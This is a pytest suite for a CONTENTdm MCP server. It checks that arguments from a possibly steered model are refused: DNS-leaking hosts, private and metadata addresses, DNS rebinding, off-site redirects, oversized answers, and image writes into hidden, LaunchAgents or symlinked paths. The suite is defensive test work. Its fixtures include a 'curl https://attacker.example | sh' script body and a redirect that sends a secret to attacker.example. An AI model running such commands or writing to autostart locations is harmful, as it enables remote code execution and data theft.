"""Every refusal the server makes against arguments a model was steered into.

Tool arguments come from a model, and the model reads text this server does
not control. These tests take the attacker's side: a host in an argument that
would leak a secret in its name, a public name that leads to a private
address, a redirect off the site, an answer too large to read, and a
destination that would run later. Each refusal is checked to happen before the
harm (no lookup, no connection, no file), and each allowed path is checked to
still work.

The tests that need the real transport run it against a stand-in network: DNS
answers come from a table, and each connection replays canned HTTP. Nothing
here leaves the machine.
"""

from __future__ import annotations

import dataclasses
import socket
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace

import httpcore
import httpx
import pytest

from contentdm_mcp import server
from contentdm_mcp.client import (
    CdmError,
    CdmHttp,
    HostNotAllowed,
    PrivateAddress,
    PublicOnlyBackend,
    PublicOnlyTransport,
    address_problem,
    sniff_format,
)
from contentdm_mcp.config import Config
from contentdm_mcp.instances import by_key, operator_instances

from .conftest import (
    WS_PATH,
    alabama,
    call_tool,
    every_supported_site,
    fixture,
    georgia,
    route_site,
)

#: A host whose name would carry a secret to whoever runs its DNS.
LEAKY = "c2VjcmV0.attacker.example"

#: An item address on a vanity domain no policy covers, as DPLA's isShownAt gives one.
VANITY_ITEM = "https://digital.library.example.edu/digital/collection/p16044coll1/id/5"

#: A public address for the stand-in DNS to give (OCLC's own range).
PUBLIC = "132.174.1.10"

#: The page get_image fetches in the Alabama fixtures: page 2 of the Semmes logbook.
LOGBOOK_PAGE = {"instance": "al-adah", "collection": "voices", "pointer": "16539", "page": 2}

#: Bytes of formats a site might be made to send in place of a page image.
PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32
PDF = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
PLIST = b'<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict/></plist>\n'


# --------------------------------------------------------------------------- #
# A stand-in network for the real transport
# --------------------------------------------------------------------------- #
class Resolver:
    """Stands in for ``socket.getaddrinfo``: answers from a table, records every name."""

    def __init__(self) -> None:
        self.answers: dict[str, list[str] | Iterator[list[str]]] = {}
        self.asked: list[str] = []

    def __call__(self, host, port, family=0, type=0, proto=0, flags=0):
        self.asked.append(host)
        answer = self.answers.get(host)
        if answer is not None and not isinstance(answer, list):
            answer = next(answer)
        if answer is None:
            raise socket.gaierror(socket.EAI_NONAME, "not in the test's table")
        return [
            (socket.AF_INET6, socket.SOCK_STREAM, 6, "", (a, port, 0, 0))
            if ":" in a
            else (socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port))
            for a in answer
        ]


class Network(httpcore.AsyncNetworkBackend):
    """Stands in for the internet: records each connection and replays canned HTTP."""

    def __init__(self) -> None:
        self.connects: list[str] = []
        self.replies: list[bytes] = []

    async def connect_tcp(self, host, port, timeout=None, local_address=None, socket_options=None):
        self.connects.append(host)
        if not self.replies:
            raise httpcore.ConnectError("no route: the suite never touches the network")
        return httpcore.AsyncMockStream([self.replies.pop(0)])

    async def connect_unix_socket(self, path, timeout=None, socket_options=None):
        raise httpcore.ConnectError("no sockets here")

    async def sleep(self, seconds):
        return None


def reply(status: int, body: bytes = b"", *, length: bool = True, **headers: str) -> bytes:
    """One HTTP/1.1 response that closes its connection."""
    lines = [f"HTTP/1.1 {status} Canned", "Connection: close"]
    lines += [f"{k.replace('_', '-')}: {v}" for k, v in headers.items()]
    if length:
        lines.append(f"Content-Length: {len(body)}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode() + body


@pytest.fixture
def network(tmp_path, monkeypatch) -> SimpleNamespace:
    """The server's client on the stand-in network, through the real public-only transport."""
    dns, net = Resolver(), Network()
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = CdmHttp(
        tmp_path / "cache",
        min_interval=0.0,
        backoff=0.0,
        transport=PublicOnlyTransport(backend=net),
    )
    monkeypatch.setattr(server.runtime, "http", http)
    monkeypatch.setattr(server.runtime, "config", Config(cache_dir=tmp_path / "cache"))
    return SimpleNamespace(http=http, dns=dns, net=net)


def link(path: Path, target: Path) -> None:
    """Make a symbolic link to a folder, or skip where the system will not let a test."""
    try:
        path.symlink_to(target, target_is_directory=True)
    except OSError as exc:  # Windows without the privilege
        pytest.skip(f"cannot make a symbolic link here: {exc}")


def configure(monkeypatch, **changes) -> None:
    """Change the running server's settings, as the operator's environment would."""
    monkeypatch.setattr(
        server.runtime, "config", dataclasses.replace(server.runtime.config, **changes)
    )


# --------------------------------------------------------------------------- #
# Which hosts a tool argument reaches
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("list_collections", {"instance": f"https://{LEAKY}"}),
        ("get_collection", {"instance": f"https://{LEAKY}", "collection": "voices"}),
        ("search", {"query": "semmes", "instance": f"https://{LEAKY}"}),
        ("search", {"query": "semmes", "instance": ["al-adah", f"https://{LEAKY}"]}),
        ("get_item", {"url": VANITY_ITEM}),
        ("get_pages", {"url": VANITY_ITEM}),
        ("get_image", {"url": VANITY_ITEM}),
    ],
)
async def test_any_other_host_is_refused_with_no_lookup_and_no_request(
    network, tmp_path, tool, args
):
    if tool == "get_image":
        args = {**args, "destination": str(tmp_path / "page.jpg")}
    out = await call_tool(tool, **args)
    assert out["error"] == "host_not_allowed"
    assert "https://cdmNNNNN.contentdm.oclc.org" in out["message"]
    assert "CONTENTDM_EXTRA_INSTANCES" in out["message"]
    assert network.dns.asked == []  # not even a lookup, which would deliver the name
    assert network.net.connects == [] and network.http.live_calls == 0
    assert not (tmp_path / "page.jpg").exists()


async def test_a_site_under_oclcs_domain_is_reached(network):
    network.dns.answers["cdm16044.contentdm.oclc.org"] = [PUBLIC]
    network.net.replies.append(
        reply(
            200,
            b'[{"alias": "/p16044coll1", "name": "County Records", "path": "/cdm/sites/16044"}]',
            content_type="application/json",
        )
    )
    out = await call_tool("list_collections", instance="https://cdm16044.contentdm.oclc.org")
    assert out["collections"][0]["collection"] == "p16044coll1"
    assert network.dns.asked == ["cdm16044.contentdm.oclc.org"]
    assert network.net.connects == [PUBLIC]  # the address that was checked, not the name


async def test_a_curated_sites_own_domain_is_reached(served, sites):
    georgia(sites)
    out = await call_tool(
        "get_item", url="https://vault.georgiaarchives.org/digital/collection/gadeaths/id/300730"
    )
    assert out["instance"] == "ga-vault" and out["title"] == "Low, Juliette Magill"
    assert {c.request.url.host for c in sites.calls} == {"cdm17154.contentdm.oclc.org"}


async def test_a_site_the_operator_added_is_reached_by_address_and_by_key(
    served, sites, monkeypatch
):
    configure(monkeypatch, extra_instances=operator_instances("https://records.example.gov"))
    route_site(
        sites,
        "https://records.example.gov",
        {
            "dmGetCollectionList/json": fixture("al_collection_list.json"),
            "dmGetCollectionFieldInfo/voices/json": fixture("al_voices_fields.json"),
            "dmGetItemInfo/voices/16539/json": fixture("al_item_16539_compound.json"),
            "dmGetCompoundObjectInfo/voices/16539/json": fixture("al_compound_16539.json"),
        },
    )
    out = await call_tool("list_collections", instance="https://records.example.gov")
    assert out["total"] == 8
    out = await call_tool(
        "get_item", url="https://records.example.gov/cdm/ref/collection/voices/id/16539"
    )
    assert out["pages"] == 13
    assert out["citation"]["url"].startswith("https://records.example.gov/digital/")
    listed = await call_tool("list_instances")
    [row] = [r for r in listed["instances"] if r.get("added_by") == "operator"]
    assert row["instance"] == "https://records.example.gov"


async def test_a_search_of_every_site_leaves_the_operators_sites_out(served, sites, monkeypatch):
    configure(monkeypatch, extra_instances=operator_instances("https://records.example.gov"))
    added = sites.route(host="records.example.gov").mock(return_value=httpx.Response(200))

    def respond(request: httpx.Request) -> httpx.Response:
        if request.url.params.get("q", "").startswith("dmGetCollectionList"):
            return httpx.Response(200, json=[])
        return httpx.Response(200, json=fixture("al_query_all_empty.json"))

    every_supported_site(sites, respond)
    out = await call_tool("search", query="semmes")
    assert out["failed"] == [] and added.call_count == 0


async def test_a_model_cannot_add_a_site(network):
    out = await call_tool("list_collections", instance="https://records.example.gov")
    assert out["error"] == "host_not_allowed" and network.dns.asked == []


# --------------------------------------------------------------------------- #
# Which addresses a connection reaches
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "address",
    [
        "10.0.0.7",
        "172.16.4.2",
        "192.168.1.1",
        "127.0.0.1",
        "169.254.169.254",
        "100.64.0.1",
        "224.0.0.251",
        "240.0.0.1",
        "0.0.0.0",
        "255.255.255.255",
        "::1",
        "::",
        "fe80::1",
        "fd00::1",
        "fec0::1",
        "ff02::1",
        "::ffff:192.168.1.1",
        "64:ff9b::a00:1",
        "2002:a00:1::1",
    ],
)
def test_a_non_public_address_is_named(address):
    assert address_problem(address)


@pytest.mark.parametrize("address", ["132.174.1.10", "8.8.8.8", "2606:4700:4700::1111"])
def test_a_public_address_passes(address):
    assert address_problem(address) is None


@pytest.mark.parametrize("address", ["10.0.0.7", "127.0.0.1", "169.254.169.254", "fd00::1"])
async def test_a_public_name_that_leads_to_a_private_address_is_refused_at_connect(
    network, address
):
    network.dns.answers["teva.contentdm.oclc.org"] = [address]
    out = await call_tool("list_collections", instance="tn-tsla")
    assert out["error"] == "private_address"
    assert address not in out["message"]  # the model is not told the inside address
    assert network.dns.asked == ["teva.contentdm.oclc.org"]
    assert network.net.connects == []


async def test_an_oclc_name_that_leads_to_a_private_address_is_refused_too(network):
    network.dns.answers["cdm99999.contentdm.oclc.org"] = ["192.168.0.10"]
    out = await call_tool("list_collections", instance="https://cdm99999.contentdm.oclc.org")
    assert out["error"] == "private_address" and network.net.connects == []


async def test_one_private_address_among_public_ones_is_enough_to_refuse(network):
    network.dns.answers["teva.contentdm.oclc.org"] = [PUBLIC, "10.0.0.7"]
    out = await call_tool("list_collections", instance="tn-tsla")
    assert out["error"] == "private_address" and network.net.connects == []


async def test_a_name_that_changes_its_answer_gains_nothing(network):
    """DNS rebinding: public for the first connection, private for the retry."""
    network.dns.answers["teva.contentdm.oclc.org"] = iter([[PUBLIC], ["127.0.0.1"]])
    out = await call_tool("list_collections", instance="tn-tsla")
    assert out["error"] == "private_address"
    assert network.dns.asked == ["teva.contentdm.oclc.org"] * 2  # checked again, not reused
    assert network.net.connects == [PUBLIC]


async def test_a_redirect_is_checked_again_where_it_connects(network):
    location = f"https://www.digital.archives.alabama.gov{WS_PATH}?q=dmGetCollectionList/json"
    network.dns.answers["digital.archives.alabama.gov"] = [PUBLIC]
    network.dns.answers["www.digital.archives.alabama.gov"] = ["10.1.1.1"]
    network.net.replies.append(reply(301, location=location))
    out = await call_tool("list_collections", instance="al-adah")
    assert out["error"] == "private_address"
    assert network.net.connects == [PUBLIC]


async def test_a_redirect_off_the_site_is_never_followed(served, sites):
    alabama(
        sites,
        **{
            "dmGetCollectionList/json": httpx.Response(
                302, headers={"location": f"https://{LEAKY}/collect?d=secret"}
            )
        },
    )
    elsewhere = sites.route(host=LEAKY).mock(return_value=httpx.Response(200, json=[]))
    out = await call_tool("list_collections", instance="al-adah")
    assert out["error"] == "moved" and elsewhere.call_count == 0


async def test_the_default_client_checks_addresses_too(tmp_path, monkeypatch):
    dns = Resolver()
    dns.answers["digital.archives.alabama.gov"] = ["127.0.0.1"]
    monkeypatch.setattr(socket, "getaddrinfo", dns)
    http = CdmHttp(tmp_path / "cache", min_interval=0.0, backoff=0.0)
    with pytest.raises(PrivateAddress):
        await http.get_json(
            by_key()["al-adah"], f"{WS_PATH}?q=dmGetCollectionList/json", ttl_days=1
        )
    await http.aclose()


def test_the_check_is_not_silently_lost_if_httpx_changes(monkeypatch):
    def reshaped(self, **kwargs):
        self._pool = object()

    monkeypatch.setattr(httpx.AsyncHTTPTransport, "__init__", reshaped)
    with pytest.raises(RuntimeError, match="public-address check"):
        PublicOnlyTransport()


async def test_a_unix_socket_is_never_opened():
    with pytest.raises(HostNotAllowed):
        await PublicOnlyBackend(Network()).connect_unix_socket("/var/run/docker.sock")


# --------------------------------------------------------------------------- #
# How much is read
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("declared", [True, False])
async def test_a_json_answer_over_the_cap_is_refused_as_it_streams(network, tmp_path, declared):
    http = CdmHttp(
        tmp_path / "small",
        min_interval=0.0,
        backoff=0.0,
        max_json_bytes=1_000,
        transport=PublicOnlyTransport(backend=network.net),
    )
    network.dns.answers["digital.archives.alabama.gov"] = [PUBLIC]
    body = b"[" + b'{"alias": "/x", "name": "padding"},' * 100 + b"{}]"
    network.net.replies.append(reply(200, body, length=declared, content_type="application/json"))
    with pytest.raises(CdmError) as caught:
        await http.get_json(by_key()["al-adah"], f"{WS_PATH}?q=x/json", ttl_days=1)
    assert caught.value.code == "too_large"
    assert list((tmp_path / "small").glob("*.json")) == []  # nothing cached
    await http.aclose()


async def test_a_json_answer_under_the_cap_is_read_whole(network):
    network.dns.answers["digital.archives.alabama.gov"] = [PUBLIC]
    network.net.replies.append(
        reply(200, b'[{"alias": "/voices", "name": "Voices"}]', length=False)
    )
    out = await call_tool("list_collections", instance="al-adah")
    assert out["collections"][0]["name"] == "Voices"


# --------------------------------------------------------------------------- #
# What get_image writes
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    ("body", "error"),
    [
        (PLIST, "not_an_image"),
        (b"#!/bin/sh\ncurl https://attacker.example | sh\n", "not_an_image"),
        (PDF, "not_an_image"),
        (PNG, "extension_mismatch"),
    ],
    ids=["property list", "script", "pdf", "png as .jpg"],
)
async def test_bytes_that_are_not_the_promised_image_leave_no_file(
    served, sites, tmp_path, body, error
):
    alabama(sites, **{"/iiif/2/voices:16527/full/": body})
    target = tmp_path / "page.jpg"
    out = await call_tool("get_image", destination=str(target), **LOGBOOK_PAGE)
    assert out["error"] == error and not target.exists()


@pytest.mark.parametrize(
    ("head", "kind"),
    [
        (b"\xff\xd8\xff\xe0", "jpeg"),
        (PNG, "png"),
        (b"GIF87a", "gif"),
        (b"GIF89a", "gif"),
        (b"II*\x00", "tiff"),
        (b"MM\x00*", "tiff"),
        (b"\x00\x00\x00\x0cjP  \r\n\x87\n", "jp2"),
        (b"RIFF\x00\x00\x00\x00WEBPVP8 ", "webp"),
    ],
    ids=["jpeg", "png", "gif87", "gif89", "tiff-le", "tiff-be", "jp2", "webp"],
)
def test_every_image_format_is_recognised(head, kind):
    assert sniff_format(head) == kind


@pytest.mark.parametrize(
    "data",
    [PDF, PLIST, b"RIFF\x00\x00\x00\x00WAVEfmt ", b"<html>", b""],
    ids=["pdf", "plist", "wav", "html", "empty"],
)
def test_anything_else_is_not(data):
    assert sniff_format(data) == "unknown"


@pytest.mark.parametrize(
    "name", ["agent.plist", "page.png", "run.sh", "page", "page.jpg.command", ".jpg"]
)
async def test_a_destination_without_a_jpeg_suffix_is_refused_before_any_request(
    served, sites, tmp_path, name
):
    route = alabama(sites)
    out = await call_tool("get_image", destination=str(tmp_path / name), **LOGBOOK_PAGE)
    assert out["error"] == "bad_extension" and route.call_count == 0
    assert not (tmp_path / name).exists()


async def test_an_upper_case_suffix_is_still_a_jpeg(served, sites, tmp_path):
    alabama(sites)
    out = await call_tool("get_image", destination=str(tmp_path / "PAGE.JPEG"), **LOGBOOK_PAGE)
    assert out["format"] == "jpeg"


@pytest.mark.parametrize(
    "where",
    [".hidden/page.jpg", ".page.jpg", "visible/.git/hooks/page.jpg", "link-to-hidden/page.jpg"],
)
async def test_a_hidden_destination_is_refused_before_any_request(served, sites, tmp_path, where):
    route = alabama(sites)
    (tmp_path / ".hidden").mkdir()
    (tmp_path / "visible/.git/hooks").mkdir(parents=True)
    link(tmp_path / "link-to-hidden", tmp_path / ".hidden")
    out = await call_tool("get_image", destination=str(tmp_path / where), **LOGBOOK_PAGE)
    assert out["error"] == "hidden_path" and route.call_count == 0
    assert list((tmp_path / ".hidden").iterdir()) == []


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    """A home folder with a Library, standing in for the user's."""
    fake = tmp_path / "home"
    (fake / "Library/LaunchAgents").mkdir(parents=True)
    (fake / "Library/Mobile Documents/Genealogy").mkdir(parents=True)
    (fake / "Pictures").mkdir()
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake))
    return fake


@pytest.mark.parametrize(
    "where", ["Library/LaunchAgents/agent.jpg", "Library/Mobile Documents/Genealogy/page.jpg"]
)
async def test_nothing_is_written_under_library(served, sites, home, where):
    route = alabama(sites)
    out = await call_tool("get_image", destination=str(home / where), **LOGBOOK_PAGE)
    assert out["error"] == "protected_location" and route.call_count == 0
    assert "CONTENTDM_DOWNLOAD_DIR" in out["message"]


async def test_library_is_recognised_however_it_is_spelt(served, sites, home):
    if not (home / "library").exists():
        pytest.skip("this file system tells upper and lower case apart")
    route = alabama(sites)
    out = await call_tool(
        "get_image", destination=str(home / "library/LaunchAgents/a.jpg"), **LOGBOOK_PAGE
    )
    assert out["error"] == "protected_location" and route.call_count == 0


async def test_a_link_into_library_is_followed_and_refused(served, sites, home):
    alabama(sites)
    link(home / "Pictures/agents", home / "Library/LaunchAgents")
    out = await call_tool(
        "get_image", destination=str(home / "Pictures/agents/a.jpg"), **LOGBOOK_PAGE
    )
    assert out["error"] == "protected_location"
    assert list((home / "Library/LaunchAgents").iterdir()) == []


async def test_a_dangling_link_is_never_written_through(served, sites, tmp_path):
    alabama(sites)
    dangling = tmp_path / "page.jpg"
    try:
        dangling.symlink_to(tmp_path / "elsewhere.jpg")
    except OSError as exc:
        pytest.skip(f"cannot make a symbolic link here: {exc}")
    out = await call_tool("get_image", destination=str(dangling), **LOGBOOK_PAGE)
    assert out["error"] == "destination_exists" and not (tmp_path / "elsewhere.jpg").exists()


async def test_with_a_download_folder_every_file_lands_inside_it(
    served, sites, tmp_path, monkeypatch
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    configure(monkeypatch, download_dir=folder)
    alabama(sites)
    out = await call_tool("get_image", destination=str(folder / "page.jpg"), **LOGBOOK_PAGE)
    assert out["path"] == str((folder / "page.jpg").resolve())


@pytest.mark.parametrize(
    "where", ["page.jpg", "downloads/../page.jpg", "downloads/escape/page.jpg", "downloadsX/a.jpg"]
)
async def test_with_a_download_folder_nothing_lands_outside_it(
    served, sites, tmp_path, monkeypatch, where
):
    folder = tmp_path / "downloads"
    folder.mkdir()
    (tmp_path / "downloadsX").mkdir()
    link(folder / "escape", tmp_path)
    configure(monkeypatch, download_dir=folder)
    route = alabama(sites)
    out = await call_tool("get_image", destination=str(tmp_path / where), **LOGBOOK_PAGE)
    assert out["error"] == "outside_download_dir" and route.call_count == 0
    assert str(folder) in out["message"]
    assert not (tmp_path / "page.jpg").exists()


async def test_a_download_folder_may_itself_be_hidden_or_under_library(
    served, sites, home, monkeypatch
):
    """The operator chose the folder; the rules apply to what a model adds below it."""
    alabama(sites)
    for folder in (home / ".archive", home / "Library/Mobile Documents/Genealogy"):
        folder.mkdir(exist_ok=True)
        configure(monkeypatch, download_dir=folder)
        out = await call_tool("get_image", destination=str(folder / "page.jpg"), **LOGBOOK_PAGE)
        assert out["format"] == "jpeg", out
        (folder / ".cache").mkdir()
        out = await call_tool(
            "get_image", destination=str(folder / ".cache/page.jpg"), **LOGBOOK_PAGE
        )
        assert out["error"] == "hidden_path"


async def test_a_download_folder_does_not_unlock_library_beneath_it(
    served, sites, home, monkeypatch
):
    configure(monkeypatch, download_dir=home)
    route = alabama(sites)
    out = await call_tool(
        "get_image", destination=str(home / "Library/LaunchAgents/a.jpg"), **LOGBOOK_PAGE
    )
    assert out["error"] == "protected_location" and route.call_count == 0
